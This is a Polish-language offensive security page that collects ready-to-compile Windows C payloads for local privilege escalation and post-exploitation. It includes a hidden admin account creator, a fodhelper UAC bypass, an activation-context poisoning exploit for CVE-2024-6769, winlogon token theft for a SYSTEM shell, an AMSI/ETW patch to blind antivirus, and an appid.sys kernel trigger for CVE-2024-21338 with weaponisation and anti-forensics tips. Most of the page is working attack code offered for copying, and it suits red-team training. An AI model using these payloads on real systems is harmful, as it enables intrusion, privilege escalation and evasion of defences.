# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ta strona zbiera **małe, samodzielne fragmenty w C**, które są przydatne podczas Windows Local Privilege Escalation lub post-exploitation. Każdy payload jest zaprojektowany tak, aby był **łatwy do skopiowania i wklejenia**, wymaga tylko Windows API / C runtime i można go skompilować przy użyciu `i686-w64-mingw32-gcc` (x86) lub `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Te payloady zakładają, że proces już posiada minimalne uprawnienia niezbędne do wykonania akcji (np. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass). Są przeznaczone do użycia w środowiskach **red-team lub CTF**, gdzie wykorzystanie podatności doprowadziło do dowolnego uruchomienia natywnego kodu.

---

## Dodaj lokalnego użytkownika administratora
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Gdy zaufany binarny plik **`fodhelper.exe`** zostanie uruchomiony, odpytywana jest poniższa ścieżka rejestru **bez filtrowania operacji `DelegateExecute`**. Poprzez umieszczenie naszego polecenia pod tym kluczem, atakujący może obejść UAC *bez* zapisywania pliku na dysku.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Minimalny PoC, który uruchamia uprzywilejowany `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Przetestowano na Windows 10 22H2 i Windows 11 23H2 (łatki z lipca 2025). Bypass nadal działa, ponieważ Microsoft nie naprawił braku sprawdzenia integralności w ścieżce `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning wciąż działają przeciwko załatanym buildom Windows 10/11, ponieważ `ctfmon.exe` uruchamia się jako proces UI o wysokiej integralności (trusted UI process), który chętnie ładuje z podszytego przez wywołującego dysku `C:` i ponownie wykorzystuje dowolne przekierowania DLL, które `CSRSS` ma w pamięci podręcznej. Nadużycie przebiega następująco: przekieruj `C:` na nośnik kontrolowany przez atakującego, wgraj trojanizowany `msctf.dll`, uruchom `ctfmon.exe`, aby uzyskać wysoką integralność, a następnie poproś `CSRSS`, aby zbuforował manifest, który przekierowuje DLL używany przez auto-elevated binary (np. `fodhelper.exe`), dzięki czemu następne uruchomienie załaduje twój payload bez monitu UAC.

Praktyczny workflow:
1. Przygotuj fałszywą strukturę `%SystemRoot%\System32` i skopiuj oryginalny plik binarny, który planujesz przejąć (często `ctfmon.exe`).
2. Użyj `DefineDosDevice(DDD_RAW_TARGET_PATH)`, aby przemapować `C:` w ramach swojego procesu, zachowując `DDD_NO_BROADCAST_SYSTEM`, żeby zmiana pozostała lokalna.
3. Wypakuj swój DLL i manifest do fałszywej struktury, wywołaj `CreateActCtx/ActivateActCtx`, aby wprowadzić manifest do activation-context cache, następnie uruchom auto-elevated binary, aby rozwiązał przekierowany DLL bezpośrednio na twój shellcode.
4. Usuń wpis cache (`sxstrace ClearCache`) lub zrestartuj system po zakończeniu, aby wymazać ślady atakującego.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Wskazówka dotycząca sprzątania: po popping SYSTEM uruchom `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, a następnie `sxstrace Parse` podczas testów — jeśli zobaczysz nazwę swojego manifestu w logu, obrońcy też ją zobaczą, więc rotuj ścieżki przy każdym uruchomieniu.

---

## Uruchom powłokę SYSTEM poprzez token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Jeśli bieżący proces posiada **oba** przywileje `SeDebug` i `SeImpersonate` (typowe dla wielu service accounts), możesz przejąć token z `winlogon.exe`, zdublować go i uruchomić proces z podwyższonymi uprawnieniami:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Aby uzyskać bardziej szczegółowe wyjaśnienie działania, zobacz:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Większość nowoczesnych silników AV/EDR opiera się na **AMSI** i **ETW** w celu wykrywania złośliwych zachowań. Załatowanie obu interfejsów wcześnie w obrębie bieżącego procesu uniemożliwia skanowanie ładunków opartych na skryptach (np. PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Powyższa poprawka ma zasięg lokalny dla procesu; uruchomienie nowego PowerShell po jej zastosowaniu spowoduje wykonanie bez inspekcji AMSI/ETW.*

---

## Utwórz proces potomny jako Protected Process Light (PPL)
Zażądaj poziomu ochrony PPL dla procesu potomnego w czasie tworzenia, używając `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Jest to udokumentowane API i zakończy się powodzeniem tylko wtedy, gdy docelowy obraz jest podpisany dla żądanej klasy podpisu (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Poziomy używane najczęściej:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Zwaliduj wynik za pomocą Process Explorer/Process Hacker, sprawdzając kolumnę Protection.

---

## Local Service -> Kernel przez `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` udostępnia obiekt urządzenia (`\\.\\AppID`), którego IOCTL utrzymujący smart-hash akceptuje wskaźniki do funkcji dostarczone przez użytkownika zawsze, gdy wywołujący działa jako `LOCAL SERVICE`; Lazarus wykorzystuje to do wyłączenia PPL i załadowania dowolnych sterowników, więc red teams powinny mieć gotowy trigger do użycia w laboratorium.

Uwagi operacyjne:
- Wciąż potrzebujesz tokenu `LOCAL SERVICE`. Uzyskaj go z `Schedule` lub `WdiServiceHost` używając `SeImpersonatePrivilege`, następnie dokonaj impersonacji przed dostępem do urządzenia, aby kontrole ACL przeszły.
- IOCTL `0x22A018` oczekuje struktury zawierającej dwa wskaźniki callback (query length + read function). Wskaż oba na stuby w trybie użytkownika, które tworzą nadpisanie tokenu lub mapują prymitywy ring-0, ale utrzymaj bufory jako RWX, aby KernelPatchGuard nie spowodował awarii w trakcie łańcucha.
- Po powodzeniu zakończ impersonację i przywróć uchwyt urządzenia; obrońcy teraz szukają nieoczekiwanych uchwytów `Device\\AppID`, więc zamknij go natychmiast po uzyskaniu uprawnień.

<details>
<summary>C - Szkieletowy trigger dla nadużycia smart-hash `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimalna poprawka dla wersji uzbrojonej: zmapuj sekcję RWX za pomocą `VirtualAlloc`, skopiuj tam swój token duplication stub, ustaw `KernelThunk = section`, i gdy `DeviceIoControl` zwróci, powinieneś mieć SYSTEM nawet pod PPL.

---

## Źródła
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimalny uruchamiacz procesów PPL: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
